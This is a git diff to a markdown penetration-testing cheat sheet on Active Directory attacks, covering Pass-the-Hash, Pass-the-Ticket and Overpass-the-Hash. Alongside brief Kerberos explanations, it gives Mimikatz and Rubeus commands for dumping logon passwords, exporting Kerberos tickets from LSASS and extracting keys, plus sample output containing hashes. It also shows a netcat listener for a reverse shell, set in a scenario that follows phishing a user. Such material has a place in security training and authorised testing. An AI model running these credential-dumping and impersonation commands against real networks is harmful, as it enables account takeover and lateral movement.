@@ -3913,20 +3913,20 @@ The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https
 
 **Start Mimikatz as Adminitrator**
 
-```bash
+```cmd
 mimikatz.exe
 ```
 
 **Get the hashes**
 
-```bash
+```cmd
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
 
 **Run a CMD as th desired user**
 
-```bash
+```cmd
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
 ```
 
@@ -3980,7 +3980,7 @@ We can also get a reverse shell connection in the target machine.
 
 **Start Netcat**
 
-```powershell
+```cmd
 .\nc.exe -lvnp <PORT>
 ```
 
@@ -4151,12 +4151,169 @@ Configuration Options:
 </details>
 
 <details>
-<summary><h2>Pass the Ticket (PtT) from Windows</h2></summary>
+<summary><h2>Pass the Ticket (PtT)</h2></summary>
+
+<details>
+<summary><h3>PtT from Windows</h3></summary>
+
+<details>
+<summary><h4>Kerberos Protocol Refresher</h4></summary>
+
+Kerberos is a ticket-based authentication system designed to avoid sharing user passwords with every service. Instead of sending passwords, the system stores authentication tickets locally and provides each service only with the specific ticket it requires. This design ensures that tickets cannot be reused for other purposes.
+
+* The **Ticket Granting Ticket (TGT)** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or **TGS**.
+* The **Ticket Granting Service (TGS)** is requested by users who want to use a service. These tickets allow services to verify the user's identity.
+
+To obtain a **TGT**, the user authenticates to the domain controller by encrypting the current timestamp using their password hash. Since the domain controller knows the user's password hash, it can decrypt the timestamp to verify the user’s identity. Upon successful validation, the domain controller issues a **TGT**. From this point onward, the user does not need to use their password again during the session.
+
+When the user wants to access a specific service—such as an MSSQL database—they request a **TGS** from the **Key Distribution Center (KDC)** using their **TGT**. The **TGS** is then presented to the MSSQL server to authenticate the user and authorize the connection.
 
 </details>
 
 <details>
-<summary><h2>Pass the Ticket (PtT) from Linux</h2></summary>
+<summary><h4>Pass the Ticket (PtT) attack</h4></summary>
+
+We need a valid Kerberos ticket to perform a Pass the Ticket (PtT) attack. It can be:
+
+* Service Ticket (TGS) to allow access to a particular resource.
+* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
+
+Before we perform a **Pass the Ticket (PtT)** attack, let's see some methods to get a ticket using **Mimikatz** and **Rubeus**.
+
+</details>
+
+<details>
+<summary><h4>Scenario</h4></summary>
+
+During a penetration test, assume we successfully phished a user and gained access to their workstation. After escalating privileges, we now hold local administrator rights on the compromised machine.
+
+With this level of access, we can interact with the Kerberos authentication mechanism in several ways—either by extracting existing tickets or generating new ones to escalate privileges, impersonate users, or move laterally across the domain.
+
+Below, we explore the most common techniques for obtaining and forging Kerberos tickets.
+
+</details>
+
+<details>
+<summary><h4>Harvesting Kerberos tickets from Windows</h4></summary>
+
+Windows processes Kerberos tickets via the LSASS (Local Security Authority Subsystem Service) process. To extract any tickets, you need to interface directly with LSASS. As a standard user, you can only retrieve Kerberos tickets associated with your own session. However, once you've elevated to local administrator, you have full access to all tickets stored in LSASS memory — including other users' TGTs and TGS tickets.
+
+> **Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
+
+<details>
+<summary><h5>Mimikatz - Export tickets</h5></summary>
+
+**Start Mimikatz as Adminitrator**
+
+```cmd
+mimikatz.exe
+```
+
+**Export tickets**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+mimikatz # exit
+```
+
+**Verify the new file**
+
+```cmd
+dir *.kirbi
+```
+
+**Expected output**
+
+```cmd
+Directory: c:\Users\Public
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+
+<SNIP>
+
+-a----        7/12/2025   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-domain.local.kirbi
+-a----        7/12/2025   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.domain.local.kirbis
+```
+
+The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
+
+> **NOTE:** Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
+
+</details>
+
+<details>
+<summary><h5>Rubeus - Export tickets</h5></summary>
+
+**Start Rubeus as Adminitrator**
+
+```cmd
+Rubeus.exe dump /nowrap
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Pass the Key / OverPass the Hash</h4></summary>
+
+The traditional **Pass-the‑Hash (PtH)** technique exploits NTLM hashes directly, bypassing Kerberos altogether by using the hash to authenticate via NTLM. In contrast, the **Pass‑the‑Key**, also known as **OverPass‑the‑Hash**, leverages a user’s key—such as an NT hash (`RC4‑HMAC`) or AES key—to request a legitimate Kerberos TGT from the domain controller. This approach forges a **Ticket Granting Ticket (TGT)** without needing the user's plaintext password.
+
+To forge our tickets, we need to have the user's hash.
+
+<details>
+<summary><h5>Mimikatz - Extract Kerberos keys</h5></summary>
+
+**Start Mimikatz as Adminitrator**
+
+```cmd
+mimikatz.exe
+```
+
+**Extract Kerberos keys**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+**Expcted Output**
+
+```cmd
+Authentication Id : 0 ; 444066 (00000000:0006c6a2)
+Session           : Interactive from 1
+User Name         : plaintext
+Domain            : <DOMAIN>
+Logon Server      : DC01
+Logon Time        : 7/12/2025 9:42:15 AM
+SID               : S-1-5-21-228825152-3134732153-3833540767-1107
+
+         * Username : plaintext
+         * Domain   : <DOMAIN>.local
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
+           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using Mimikatz and Rubeus.
+
+</details>
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>PtT from Linux</h3></summary>
+
+</details>
 
 </details>
 
